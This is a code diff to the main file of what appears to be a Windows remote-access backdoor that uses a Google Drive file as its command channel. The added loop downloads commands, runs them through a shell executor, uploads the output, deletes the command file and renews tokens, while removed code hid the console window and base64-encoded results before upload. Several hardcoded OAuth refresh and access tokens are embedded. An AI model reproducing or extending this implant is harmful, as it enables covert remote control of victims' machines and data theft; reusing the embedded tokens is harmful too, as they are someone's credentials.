@@ -1,9 +1,16 @@
 #include <stdio.h>
 #include <iostream>
 #include <windows.h>
+#include <stack>
 #include "CloudFunctions.h"
-#include <stdio.h>
+#include <spdlog/spdlog.h>
 
+#ifdef DISABLE_LOGGING
+#define SPDLOG_ACTIVE_LEVEL SPDLOG_LEVEL_OFF
+#endif
+
+#define INIT_REFRESH_TOKEN "1//0cBJYjJnJ_qNDCgYIARAAGAwSNwF-L9Irkd3ReANUUHaWjvjpylKsfc_H0l2rsXqR1HTtKaXvq_5U2WEtTznd2b4ET5x_ozSQ7xk"
+#define INIT_ACCESS_TOKEN "ya29.a0AeDClZAVWGAhNiMq4r83C2l81hdWXlEZTVZM6PwLt-Ykv-WzBV4pvLrOqKbasCX0lCt0W_w0B8MY2IXlzMLjSVN_Rv2nO3a7O8TfzLmelCIuPzYqGDv5SYVdM4DFQRGSZrQj_O2hDZIRfWsIs2HXLPEnX9gFQxeDjkS3E-8eaCgYKAbQSARASFQHGX2MikAiEu5tuloWf6LrOR5wfHA0175"
 int Odd_Num() {
 	int result = rand();
 	if (result % 2 == 1)
@@ -12,161 +19,250 @@ int Odd_Num() {
 		return result - 1;
 }
 
-//int main() {
-//    //HWND h = GetConsoleWindow();
-//    //ShowWindow(h, 0);
-//    DWORD i = 2;
-//    while (Odd_Num() % 2 != 0) {
-//        Sleep(expo(i, 4) * 1000);
-//        MyString data = downloadContext();
-//        if (data.getLength() > 0) {
-//            
-//            i = 2;
-//            for (int i = 0; i < data.getLength(); i++) {
-//                if (data.getCharAt(i) == '\n') {
-//                    data.setCharAt(i, '&');
-//                }
-//            }
-//            FILE* file = _popen(data.getContext(), "r");
-//            MyString output = "";
-//            char temp_buffer[1024];
-//            while (fgets(temp_buffer, sizeof(temp_buffer), file) != NULL) {
-//                output = output + temp_buffer;
-//            }
-//            //output = encoder(output, 1);
-//            output = converter_64(output);
-//            upload(output);
-//            deleteContext();
-//        } else {
-//            i++;
-//        }
-//    }
-//    return 0;
-//}
-
-//int main() {
-//    std::string input = "dir\nnet user\necho bs";
-//    std::string output;
-//    std::string refreshToken = "1//096ZhTtrDfXWZCgYIARAAGAkSNwF-L9Irke58b_l5qre3YgjxF1s1ECbfBxm3GCk6AQ8QO-pVQmCfvdjZA642F2UH5ba9SXVPLc0";
-//    std::string accessToken = "ya29.a0AcM612yAGs8UlIH-gS2FWZoRh1CJbVp6MuvnOgITPeR8rVIhIxH7lRUnb6HYprjxGB9s5HKSwr7rC243kUafPzZRhaMogGtSz7HYSyMmKIy2v715KlgnqDLvJBcx-RhH1rdYy4u8s4O47bm-YepXVsqmxsZEgpLZqp_6JsDGaCgYKAS4SARASFQHGX2MiyUaUXVQWZZJqaljl27SHjA0175";
-//    output = "Start!";
-//    //for (int i = 0; i < 10 * 1024; i++)
-//    //{
-//    //    output += "a";
-//    //}
-//    //output += "End!";
-//    WORD errorCode;
-//    //errorCode = singlePartUpload(output, accessToken, 151, 27);
-//    //errorCode = downloadSourceContext(accessToken, output);
-//    //DWORD responseCode;
-//    //errorCode = setNewRefreshAndAccessToken(refreshToken, accessToken);
-//    //handleFailsafe(refreshToken, accessToken);
-//    //printf("Test begins:\nThe refresh token is: %s\nThe access token is: %s\nWith the response code: %d\n", refreshToken.c_str(), accessToken.c_str(), errorCode);
-//
-//    //downloadContext(accessToken, output);
-//    //printf("Test begins:\nThe single upload error code: %d", errorCode);
-//    //printf_s("Source Context is: %s", output.c_str());
-//    //std::replace(input.begin(), input.end(), '\n', '&');
-//    
-//    //commandExecuter(input, output);
-//    //printf("Command execution result: %s", output.c_str());
-//    
-//    //errorCode = deleteSource(accessToken);
-//    //printf("Source deleted with code: %d", errorCode);
-//    //errorCode = uploadResult(output, accessToken, 4);
-//    //printf("Upload is done with code: %d\n", errorCode);
-//
-//    return 0;
-//}
-
 int APIENTRY WinMain(HINSTANCE hInst, HINSTANCE hInstPrev, PSTR cmdline, int cmdshow) {
 
-	printf("test");
+	MessageBoxA(NULL, "test", "test", 0);
 
 }
 
-int main() {
+void main() {
+
+	std::stack<BYTE> states;
+	BYTE lastState = STATE_INIT;
 	std::string data, accessToken, refreshToken;
-	WORD index = 0, resCode = 200;
-	BYTE curState = STATE_DOWNLOADING;
+	DWORD lastIndex = 0, lastSubIndex = 0, tries = 1;
+	WORD resCode = BDRIVE_OK;
+	states.push(STATE_DOWNLOADING);
 
-	accessToken = "ya29.a0AcM612wOV2jq5JBUaipmWBMt-7lKQ2ZnZ9qN-2GYCGj9A9R7n30iCp23FFiz2wCTcvvh6jJQqtkgLG59Y5dn-C5wNPJ4Zm8Jv9W1NsXD9VHPk_4UuZlIcGRm9-8V4jIlfQlQe-mwD3lQgSd1GaarrKss1aXdoa88h3iD82n4aCgYKAUASARASFQHGX2Mi-1e5ZtSfC9582golBOvzhw0175";
+	accessToken = INIT_ACCESS_TOKEN;
+	refreshToken = INIT_REFRESH_TOKEN;
 
-	refreshToken = "1//09qDIhV4v_VrlCgYIARAAGAkSNwF-L9Irb3sDBh4JXYa4e2j9m9jyfDO2fFqcaB8at3H3FHWfKw7ImT78Lrcx6MFnBV3DKjAjD8o";
+	spdlog::info("The for loop is about to start!");
 
-	while (1) {
-		if (curState == STATE_DOWNLOADING)
+	for (BYTE top = STATE_INIT; true;) {
+
+		top = states.top();
+
+		if (top == STATE_DOWNLOADING)
 		{
+			spdlog::info("Shell is in STATE_DOWNLOADING!");
+
+			states.pop();
 			resCode = downloadSourceContext(accessToken, data);
-			if (resCode == BDRIVE_OK)
+
+			switch (resCode)
 			{
-				curState = STATE_EXECUTING;
-				continue;
+			case BDRIVE_OK:
+				spdlog::warn("Download completed!");
+				
+				states.push(STATE_EXECUTING);
+				//sleep
+				break;
+			case BDRIVE_INVALID_ACCESS_TOKEN:
+				spdlog::warn("Access token lost!");
+				
+				states.push(STATE_DOWNLOADING);
+				states.push(STATE_ACCESS_TOKEN_LOST);
+				//sleep
+				break;
+			case BDRIVE_NO_CONTENT:
+				spdlog::warn("Source file is empty!");
+
+				states.push(STATE_DOWNLOADING);
+				//sleep
+				break;
+			case BDRIVE_TIMED_OUT:
+			case BDRIVE_NO_INTERNET:
+				spdlog::warn("Connection lost!");
+				
+				states.push(STATE_DOWNLOADING);
+				states.push(STATE_CONNECTION_LOST);
+			default:
+				spdlog::warn("Something unhandled happened!");
+				
+				states.push(STATE_DOWNLOADING);
+				break;
 			}
 		}
-		else if (curState == STATE_EXECUTING)
+		else if (top == STATE_EXECUTING)
 		{
-			if (!commandExecuter(data, data)) {
-				curState = STATE_UPLOADING;
-				continue;
+			spdlog::info("Shell is in STATE_EXECUTING!");
+
+			states.pop();
+
+			if (commandExecuter(data, data)) {
+				spdlog::warn("Something unhandled happened!");
+				states.push(STATE_EXECUTING);
 			}
-		}
-		else if (curState == STATE_UPLOADING)
-		{
+			else
+			{
+				states.push(STATE_UPLOADING);
+				spdlog::warn("Command Execution done!");
+			}
 
 		}
+		else if (top == STATE_UPLOADING)
+		{
+			spdlog::info("Shell is in STATE_UPLOADING!");
+
+			states.pop();
+			resCode = uploadResult(data, accessToken, lastIndex, lastSubIndex);
+
+			switch (resCode)
+			{
+			case BDRIVE_OK:
+				spdlog::warn("Uploading the result successfully done!");
+
+				lastIndex++;
+				lastSubIndex = 0;
+				states.push(STATE_DELETING);
+				break;
+			case BDRIVE_NO_INTERNET:
+			case BDRIVE_TIMED_OUT:
+				spdlog::warn("Connection lost!");
+
+				states.push(STATE_UPLOADING);
+				states.push(STATE_CONNECTION_LOST);
+				break;
+			case BDRIVE_INVALID_ACCESS_TOKEN:
+				spdlog::warn("Access token lost!");
+
+				states.push(STATE_UPLOADING);
+				states.push(STATE_ACCESS_TOKEN_LOST);
+				break;
+			default:
+				spdlog::warn("Something unhandled happened!");
+
+				states.push(STATE_UPLOADING);
+				break;
+			}
+		}
+		else if (top == STATE_DELETING)
+		{
+			spdlog::info("Shell is in STATE_DELETING!");
+
+			states.pop();
+			resCode = deleteSource(accessToken);
+
+			switch (resCode)
+			{
+			case BDRIVE_OK:
+				spdlog::warn("Deleting source file successfully done!");
+
+				states.push(STATE_DOWNLOADING);
+				break;
+			case BDRIVE_TIMED_OUT:
+			case BDRIVE_NO_INTERNET:
+				spdlog::warn("Connection lost!");
+
+				states.push(STATE_DELETING);
+				states.push(STATE_CONNECTION_LOST);
+				break;
+			case BDRIVE_INVALID_ACCESS_TOKEN:
+				spdlog::warn("Access token lost!");
+
+				states.push(STATE_DELETING);
+				states.push(STATE_ACCESS_TOKEN_LOST);
+				break;
+			default:
+				spdlog::warn("Something unhandled happened!");
+
+				states.push(STATE_DELETING);
+				break;
+			}
+		}
+		else if (top == STATE_ACCESS_TOKEN_LOST) {
+			spdlog::info("Shell is in STATE_ACCESS_TOKEN_LOST!");
+
+			states.pop();
+			resCode = setNewAccessToken(accessToken, refreshToken);
+			switch (resCode)
+			{
+			case BDRIVE_OK:
+				spdlog::warn("New access token has been set!");
+
+				break;
+			case BDRIVE_INVALID_REFRESH_TOKEN:
+				spdlog::warn("Refresh token is invalid!");
+
+				states.push(STATE_REFRESH_TOKEN_LOST);
+				break;
+			case BDRIVE_NO_INTERNET:
+			case BDRIVE_TIMED_OUT:
+				spdlog::warn("Connection lost!");
+
+				states.push(STATE_ACCESS_TOKEN_LOST);
+				states.push(STATE_CONNECTION_LOST);
+				break;
+			default:
+				spdlog::warn("Something unhandled happened!");
+
+				states.push(STATE_ACCESS_TOKEN_LOST);
+				break;
+			}
+
+		}
+		else if (top == STATE_REFRESH_TOKEN_LOST) {
+			spdlog::info("Shell is in STATE_REFRESH_TOKEN_LOST!");
+
+			states.pop();
+			resCode = setNewRefreshAndAccessToken(refreshToken, accessToken);
+
+			switch (resCode)
+			{
+			case BDRIVE_OK:
+				spdlog::warn("New access & refresh token has been set!");
+
+				break;
+			case BDRIVE_NO_CONTENT:
+			case BDRIVE_TIMED_OUT:
+			case BDRIVE_NO_INTERNET:
+			default:
+				spdlog::warn("Connection lost!");
+				states.push(STATE_CONNECTION_LOST);
+				break;
+			}
+
+		}
+		else
+		{
+			spdlog::info("Shell is in STATE_CONNECTION_LOST!");
+
+			states.pop();
+			resCode = checkConnection();
+			switch (resCode)
+			{
+			case BDRIVE_OK:
+				spdlog::warn("It's back online!");
+
+				break;
+			default:
+				spdlog::warn("Connection still lost!");
+
+				states.push(STATE_CONNECTION_LOST);
+				break;
+			}
+		}
+
+		if (top == lastState)
+		{
+			tries++;
+		}
+		else {
+			lastState = top;
+			tries = 1;
+		}
+
+		Sleep(expo(1, tries) * 1000);
 	}
+}
 
-	//while(1){
+void main1() {
 
-	//	resCode = downloadSourceContext(accessToken, data);
-	//	switch (resCode)
-	//	{
-	//	case BDRIVE_OK:
-	//		commandExecuter(data, data);
+	//FILE* file = _popen("powershell -c \" $response.StatusCode;try { $response = Invoke-RestMethod 'http://www.google.com' -TimeoutSec 30 -Method 'HEAD'; Write-Host -NoNewline $response.StatusCode } catch [System.Net.WebException] { if ($_.Exception.Message -like '*timed out*') { Write-Host -NoNewline 600 } elseif ($_.Exception.Response -ne $null) {Write-Host -NoNewline $_.Exception.Response.StatusCode.value__ } else { Write-Host -NoNewline 601} } catch { Write-Host -NoNewline 601}\"", "r");
+	//char buffer[1024];
+	//fgets(buffer, 1023, file);
+	//fgets(buffer, 1023, file);
 
-	//		resCode = uploadResult(data, accessToken, index);
-
-	//		switch (resCode)
-	//		{
-	//		case BDRIVE_OK:
-	//			resCode = deleteSource(accessToken);
-
-	//			switch (resCode)
-	//			{
-	//			case BDRIVE_OK:
-	//				break;
-	//			case BDRIVE_NO_INTERNET:
-	//				break;
-	//			case BDRIVE_INVALID_ACCESS_TOKEN:
-	//				break;
-	//			case BDRIVE_TIMED_OUT:
-	//				break;
-	//			default:
-	//				break;
-	//			}
-	//			break;
-	//		case BDRIVE_NO_INTERNET:
-	//			break;
-	//		case BDRIVE_INVALID_ACCESS_TOKEN:
-	//			break;
-	//		case BDRIVE_TIMED_OUT:
-	//			break;
-	//		default:
-	//			break;
-	//		}
-	//		break;
-	//	case BDRIVE_NO_CONTENT:
-	//		break;
-	//	case BDRIVE_INVALID_ACCESS_TOKEN:
-	//		break;
-	//	case BDRIVE_TIMED_OUT:
-	//		break;
-	//	case BDRIVE_NO_INTERNET:
-	//		break;
-	//	default:
-	//		break;
-	//	}
-	//	printf("test result with code %d:\n%s\n", resCode, data.c_str());
-	//}
+	printf("The code of connection is: %d", checkConnection());
 }
